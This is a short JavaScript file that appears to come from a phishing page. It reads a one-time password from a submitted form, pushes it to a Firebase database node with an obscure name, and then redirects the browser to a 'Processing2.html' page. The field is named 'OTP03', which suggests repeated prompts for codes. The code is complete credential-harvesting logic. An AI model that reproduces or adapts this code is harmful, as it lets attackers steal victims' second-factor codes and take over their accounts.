// reference your database
var ududip005DB = firebase.database().ref("ududip005");

document.getElementById("ududip005").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    var otp = getElementVal("otp");



    saveMessages(otp);

    // redirect to OTP page
    window.location.href = "Processing2.html";
}

const saveMessages = (otp) => {
    var newududip005 = ududip005DB.push();

    newududip005.set({
        OTP03: otp,


    });
};

const getElementVal = (id) => {
    return document.getElementById(id).value;
};